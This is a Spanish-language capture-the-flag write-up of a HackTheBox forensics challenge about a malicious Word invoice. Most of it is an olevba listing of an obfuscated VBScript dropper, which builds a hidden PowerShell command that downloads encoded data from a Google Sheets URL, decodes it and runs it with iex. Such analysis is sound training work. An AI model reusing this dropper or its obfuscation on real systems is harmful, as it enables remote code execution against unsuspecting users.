---
title: Scripts and Formulas
description: >
  HackTheBox Forensics Challenge - Easy<br>
  [Challenge Download](https://app.hackthebox.com/challenges/515)
date: 2024-05-08
weight: 10
tags: ["htb","forensics","easy", "macros", "olevba", "microsft word"]
---

---
# Enunciado del problema

After the last site UNZ used to rely on for the majority of Vitalium mining ran dry, the UNZ hired a local geologist to examine possible sites that were used in the past for secondary mining operations. However, after finishing the examinations, and the geologist was ready to hand in his reports, he mysteriously went missing! After months, a mysterious invoice regarding his examinations was brought up to the Department. Being new to the job, the clerk wasn't aware of the past situation and opened the Invoice. Now all of a sudden, the Arodor faction is really close to taking the lead on Vitalium mining! Given some Logs from the Clerk's Computer and the Invoice, pinpoint the intrusion methods used and how the Arodor faction gained access!

---
# Resolución

Como es habitual nos dan un documento word y vamos a ver si tiene macros, y como es de esperar, si tiene:

```bas
-------------------------------------------------------------------------------
VBA MACRO invoice.vbs 
in file: invoice.vbs - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

    REM While VBA might seem daunting to beginners, numerous resources are available to help users get started. Microsoft provides comprehensive documentation, tutorials, and a vibrant community of users sharing their knowledge and solutions. Online forums, blogs, and video tutorials offer practical examples and guidance for leveraging VBA in Microsoft Office applications. Additionally, recording and modifying macros is an excellent starting point for understanding VBA code and automating repetitive tasks.

    REM The great power of VBA programming in Office is that nearly every operation that you can perform with a mouse, keyboard, or a dialog box can also be automated by using VBA. Further, if it can be done once with VBA, it can be done just as easily a hundred times. In fact, the automation of repetitive tasks is one of the most common uses of VBA in Office.
    Function ZbVxxAHCsiTnKpIJ()
        Dim yNSlalZeGAsokjsP
        Dim pJmLeYiULjageWIP
        Dim cMtARTHTmbqbxauA 
        Dim bZzPBAGNtCswuUoo
        Dim QlAtSUbRwRFNlEjX

        Dim objShell
        Set objShell = WScript.CreateObject("WScript.Shell")

        yNSlalZeGAsokjsP = LLdunAaXwVgKfowf("BcV:L\XwFiInDdDoXw7s1\9sNy4sIt9eGm") & "32" & LLdunAaXwVgKfowf("V312I\OwFiPnDdJo0wVsDp7oFw7e6r5sBhCeTl1lB\Ev81IU04") & "1.0" & LLdunAaXwVgKfowf("\9pMoBw7eTrMsDhKeVlOl1.WeMxUe")
        cMtARTHTmbqbxauA = yNSlalZeGAsokjsP & " " & LLdunAaXwVgKfowf("EK-MMe4RpHW JIb9FyG7pSZaQ6s56sYB IN-4XwMT OThL2i64dSGdEXe0CnNE 9Q-X6c4V ") & Chr(34) & LLdunAaXwVgKfowf("M0F$BWQuEKRrCBAlAY9 1JQ=65V QTL[KTCsEMKyRE4sTJ3tMY0eQAVmF9E.60Qt7KEeZTUxXD6t0LC.CF9eXAWn5HDcGMSoZOFdT2KiCQ3n0KNgFUN]5YP:3PY:BLLaQ2VsZMUcJAYi4MXiKCX.4I8gY2Ae0YItJYKsU8MtLZ9rMUZiM95nJH4gTDX(HZP[H4RsWZ7yOCKsMX2tNWIe02ZmOH8.BCVcE9SoAXHnP9QvDXJe3CJrD51t2LE]C2L:0M2:I66f616rSKCoFKXmMKAb3X9aGMSsWO4e") & "64" & LLdunAaXwVgKfowf("E1sFUtLBrDIiTXn9NgZG(ED'88") & "aHR0cHM6Ly9zaGVldHMuZ29vZ2xlYXBpcy5jb20vdjQvc3ByZWFkc2hlZXRzLzFIcEI0R3FxWXdJNlg3MXo0cDJFSzg4Rm9KanJzVzJES2JTa3gtcm81bFFRP2tleT1BSXphU3lEVXBqU2Y3UjFsMWRRb2hBNVF2OUVkeVdBM0tCT01jMFUmcmFuZ2VzPVNoZWV0MSFPMzcmaW5jbHVkZUdyaWREYXRhPXRydWU=" & LLdunAaXwVgKfowf("ECK5'1Y)44)UQ;2F$B7rNGe7AsNGpMV J2=QG XBi1BnYNv8So3XkNKe70-CGrO6e54sU8tZ9m6Le6FtI8hX1oTJdXF DD-LGuXMrUKiLC AA$CVuEBrBJl") & LLdunAaXwVgKfowf(";VQI$WN2pV0XaRDAyTQDlB8RoMOWaMQ9d71C I1G=XC1 JBM$XOFrSGBeL3Qs7HNp9ZG.DH0sOC1hQ15e8VNePHVtZ8RsMS5[") & "0" & LLdunAaXwVgKfowf("7010HGS]F6H.JTWdB0Na3CHtT27aW5W[") & "0" & LLdunAaXwVgKfowf("7Z10CS0]V4E.9H0rRO1oHJEw") & "D" & LLdunAaXwVgKfowf("YP7aQTYtE3UaYLX[") & "0" & LLdunAaXwVgKfowf("OPI0J12]JUK.TK7v7J0aRTGl9B2uFO7eV11sOEC[") & "0" & LLdunAaXwVgKfowf("VKB0X4U]VO2.ZMIf4FIoD02r82Mm5NNaNIVt2Z4tH3JeYWLd") & "V" & LLdunAaXwVgKfowf("F2aESlKEuR0e5Y;R4$UAdZIeBIcL5o51dPXeEW CK=4Q LS[M8sYHyE3s82t6YeAXmB2.12cXZo2PnZKvYEeOWrK9tQN]YQ:QQ:RZfK6rJIoQVmRRbBUa6RsHOeUZ") & "64" & LLdunAaXwVgKfowf("6934MPsZAt50rIFiUYn6Sg46(HG$JFpE7aNAyVHlL9oH0aQNdUX)VA;XK$YEmM4s59 87=PT FHnETe61wYM-SYo5Bb6VjHPe3DcHQtET 7SsQ0yIKs6Pt71eBTmJQ.7GiI5oT4.SDmUQeVDmAMoRZrUGyGAsG1tK7rM9ePMaUQmTT;YF$Z1mWTsIZ.5Ww4CrBZi1CtCNeTU(W0$0LdFXe2HcDDoBAd3HeXL,") & "0" & LLdunAaXwVgKfowf("Q8Z,409 12M$S2Zd5JAeVHYc6DNoEOCdEZZeOVB.9RYlTD3eP6HnB29g1VYtHC2hHIN)FND;20Z$KJ5mJZYsFHJ.I28p0VYo48Gs1V9i91DtEPNiLLUoP49n000 DC8=F7S") & "0" & LLdunAaXwVgKfowf("1;2$Fs1rV C=W Dn8e7wB-YoMbAjXeIc4tY SsFyAsItQeNmI.8iQoY.WsGt2rBe5aDm3rReEaBdPeArR(1nCe1wI-RoPbMjNeDcWt6 BsJy7sNt2eEm5.SiZoQ.JcKoMmYp8rWeDs6sZiWoRn0.TdPe8f6lIaYtJeXsBt2rDeHaNmF(3$NmRsO,7 M[AsQyPsKt9e7mR.Hi5oD.WcEoNmDp5rRe8sMsBi4oMn1.8cLoSmQpPrHeIsCsJi2oMnEmHo5dCeA]6:X:IdEeMcRoQmLpGr1eIs4sY)T)F;A$Md7aDtXaM F=B W$OsBrH.CrWeWaVdKtXo2eAnAd1(P)E;K$Gs7r2.2cYlZoVsEeM(O)0;I$Tm0sB.YcHlNoXs6eO(P)0;IWP$TIVd5MUaSLGtSPXa") & "|iex" & Chr(34)
        objShell.Run cMtARTHTmbqbxauA
    End Function
    REM Beyond the power of scripting VBA to accelerate every-day tasks, you can use VBA to add new functionality to Office applications or to prompt and interact with the user of your documents in ways that are specific to your business needs. For example, you could write some VBA code that displays a pop up message that reminds users to save a document to a particular network drive the first time they try to save it.
    REM This code example shows how to take data from a worksheet and create a table of contents in an HTML file. The worksheet should have data in columns A, B, and C that correspond to the first, second, and third levels of the table of contents hierarchy. The HTML file is stored in the same working folder as the active workbook.
    REM crucial for professionals across various industries. Microsoft Office, the go-to suite of productivity tools, offers a wealth of features and functionalities to enhance efficiency. However, many users are unaware of the hidden gem within Office: Visual Basic for Applications (VBA). This versatile programming language empowers users to automate tasks, customize applications, and unleash the full potential of Microsoft Office.
    REM Excel, with its powerful data analysis capabilities, is a staple tool for professionals dealing with spreadsheets and calculations. VBA allows users to automate complex operations, manipulate data, and create custom functions to meet specific needs. By writing VBA code, users can streamline repetitive tasks like data entry, report generation, and data formatting. The ability to record and edit macros further simplifies the automation process, making it accessible to users without extensive programming knowledge.

    REM Microsoft Word is widely used for creating documents, reports, and templates. With VBA, users can extend Word's functionality beyond its native features. VBA enables the creation of custom toolbars, buttons, and shortcuts to access frequently used commands. Users can also automate document creation by generating personalized letters, merging data from external sources, and performing advanced text manipulations. VBA provides a vast array of possibilities for automating workflows and enhancing document management.
    REM While VBA might seem daunting to beginners, numerous resources are available to help users get started. Microsoft provides comprehensive documentation, tutorials, and a vibrant community of users sharing their knowledge and solutions. Online forums, blogs, and video tutorials offer practical examples and guidance for leveraging VBA in Microsoft Office applications. Additionally, recording and modifying macros is an excellent starting point for understanding VBA code and automating repetitive tasks.

    REM Visual Basic for Applications (VBA) is a powerful tool that unlocks the true potential of Microsoft Office. By enabling automation, customization, and streamlining workflows, VBA empowers users to work more efficiently and effectively with Excel, Word, PowerPoint, Access, and Outlook. With its versatility and extensive capabilities, VBA provides professionals with a means to save time, reduce errors, and accomplish more in their day-to-day tasks. Embracing VBA can transform Microsoft Office into a tailored and automated productivity suite, revolutionizing the way we work.
    REM VBA can transform PowerPoint into a dynamic presentation tool. Users can leverage VBA to automate the creation of slideshows, generate charts and graphs, and add interactive elements to engage the audience. By utilizing VBA, professionals can reduce the time spent on repetitive tasks such as formatting slides, applying consistent styles, and inserting multimedia content. With the ability to programmatically control every aspect of a presentation, VBA empowers users to deliver impactful and visually stunning presentations.
    Function LLdunAaXwVgKfowf(t)
        Dim msStr()
        ReDim msStr(Len(t))
        Dim jKaNZCemSwPDrmLT
        jKaNZCemSwPDrmLT = ""
        For i = 1 To UBound(msStr)
            msStr(i) = Mid(t, i, 1)
        Next
        For Each qqEPRvFjIuMSmDvM In msStr
            If qqEPRvFjIuMSmDvM = LCase(qqEPRvFjIuMSmDvM) And Not IsNumeric(qqEPRvFjIuMSmDvM) Then jKaNZCemSwPDrmLT = jKaNZCemSwPDrmLT + qqEPRvFjIuMSmDvM
        Next
        LLdunAaXwVgKfowf = jKaNZCemSwPDrmLT
    End Function
    REM VBA extends the capabilities of Microsoft Access and Outlook, allowing users to build powerful databases and automate email communication. In Access, VBA enables the creation of custom forms, reports, and queries, facilitating efficient data management. For Outlook, VBA offers the ability to automate email processing, organize messages into folders, and perform advanced filtering. By leveraging VBA, users can customize these applications to suit their specific needs, increasing productivity and efficiency.
    Sub Main()
        ZbVxxAHCsiTnKpIJ()
    End Sub

    Main()
```

También tenemos unos logs (*evtx*) dentro de: *logs.zip* aparte de un windows shortcut que nos menciona: **wordpad.exe** y **powershell.exe**. 